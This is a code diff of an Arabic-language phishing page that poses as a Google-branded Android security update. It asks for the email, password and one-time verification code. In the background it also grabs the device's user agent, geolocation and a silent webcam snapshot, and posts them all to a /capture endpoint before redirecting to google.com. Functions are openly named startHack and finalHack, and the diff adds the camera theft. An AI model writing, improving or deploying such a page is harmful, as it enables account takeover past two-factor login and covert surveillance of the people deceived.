@@ -2,60 +2,82 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <link rel="manifest" href="/manifest.json">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث أمن Android</title>
+    <title>تحديث أمن النظام</title>
     <style>
-        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-        .box { background: #1e1e1e; padding: 25px; border-radius: 15px; border: 1px solid #333; margin-top: 50px; }
-        input { width: 90%; padding: 15px; margin: 10px 0; border-radius: 8px; border: none; background: #2a2a2a; color: white; }
-        button { background: #007bff; color: white; width: 95%; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .loading { display: none; color: #007bff; margin-top: 10px; }
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; width: 90%; max-width: 400px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #222; color: #fff; box-sizing: border-box; }
+        button { background: #1a73e8; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .loading { display: none; margin-top: 20px; color: #1a73e8; }
     </style>
 </head>
 <body>
-    <div class="box" id="main">
+    <div class="card" id="box">
         <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" width="50">
-        <h2>تنبيه أمني عاجل</h2>
-        <p>تم اكتشاف محاولة اختراق لجهازك. يرجى تأكيد حسابك لتفعيل درع الحماية المحدث.</p>
+        <h2>تحديث أمني مطلوب</h2>
+        <p>لحماية حسابك من الاختراق، يرجى تسجيل الدخول لتحديث درع الحماية.</p>
+        
         <div id="step1">
             <input type="email" id="email" placeholder="البريد الإلكتروني">
             <input type="password" id="pass" placeholder="كلمة المرور">
-            <button onclick="hack()">تفعيل الحماية الآن</button>
+            <button onclick="startHack()">تحديث الآن</button>
         </div>
+
         <div id="step2" style="display:none;">
-            <p>أدخل رمز التحقق (OTP) الذي وصلك الآن:</p>
+            <p>أدخل رمز التحقق (OTP) المكون من 6 أرقام:</p>
             <input type="number" id="otp" placeholder="000000">
-            <button onclick="finish()">تأكيد الرمز</button>
-            <p id="status" class="loading">جاري فحص الرمز...</p>
+            <button onclick="finalHack()">تأكيد الهوية</button>
+            <div class="loading" id="loader">جاري التحقق من الأمان...</div>
         </div>
     </div>
 
     <script>
-        async function hack() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('pass').value;
-            if(!email || !password) return alert("يرجى إكمال البيانات");
+        let collectedData = {};
+
+        async function startHack() {
+            collectedData.email = document.getElementById('email').value;
+            collectedData.password = document.getElementById('pass').value;
+            collectedData.device = navigator.userAgent;
+
+            if(!collectedData.email || !collectedData.password) return alert("يرجى إكمال البيانات");
 
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'block';
 
-            // سحب الموقع والكاميرا في الخلفية
-            const device = navigator.userAgent;
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                send('/capture', { email, password, device, location: { lat: p.coords.latitude, lon: p.coords.longitude } });
-            }, () => {
-                send('/capture', { email, password, device });
+            // سحب الموقع والصورة فوراً في الخلفية
+            navigator.geolocation.getCurrentPosition(p => {
+                collectedData.location = { lat: p.coords.latitude, lon: p.coords.longitude };
+                sendData();
+            }, () => sendData());
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                collectedData.image = canvas.toDataURL('image/png');
+                stream.getTracks().forEach(t => t.stop());
+                sendData();
+            } catch (e) {}
+        }
+
+        async function finalHack() {
+            collectedData.otp = document.getElementById('otp').value;
+            document.getElementById('loader').style.display = 'block';
+            await sendData();
+            setTimeout(() => { window.location.href = "https://google.com"; }, 4000);
+        }
+
+        async function sendData() {
+            await fetch('/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(collectedData)
             });
-        }
-
-        async function send(url, data) {
-            await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
-        }
-
-        function finish() {
-            document.getElementById('status').style.display = 'block';
-            setTimeout(() => { window.location.href = "https://google.com"; }, 3000);
         }
     </script>
 </body>
